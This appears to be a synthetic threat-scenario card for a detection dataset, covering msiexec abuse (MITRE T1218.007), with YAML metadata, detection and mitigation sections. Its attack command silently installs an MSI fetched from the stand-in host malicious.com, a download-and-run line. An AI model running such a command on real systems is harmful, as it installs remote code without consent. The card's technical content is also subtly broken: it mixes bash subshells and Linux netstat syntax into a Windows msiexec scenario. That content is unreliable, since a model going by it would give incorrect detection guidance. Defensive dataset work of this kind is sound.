---
type: campaign
scenario_id: 58
tactic: Defense Evasion
technique: "T1218.007: Msiexec"
technique_id: T1218.007
tags: [campaign, lotl, defense_evasion]
---

# Using msiexec to install malicious MSI package remotely.

## Threat Description
Using msiexec to install malicious MSI package remotely.

## Attack Command
```
msiexec /quiet /i http://malicious.com/$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi)
```

## Detection Logic
Monitor msiexec network activity: `netstat -anp | grep msiexec`; YARA rule: `rule MsiexecRemote { strings: $a = /msiexec.*http/ nocase; condition: $a }`

## Mitigation
Block msiexec network access: `netsh advfirewall firewall add rule name='Block msiexec' dir=out program='%windir%\System32\msiexec.exe' action=block`; Restrict MSI execution: AppLocker.

## AI Training Prompt
Train AI to detect msiexec remote MSI execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
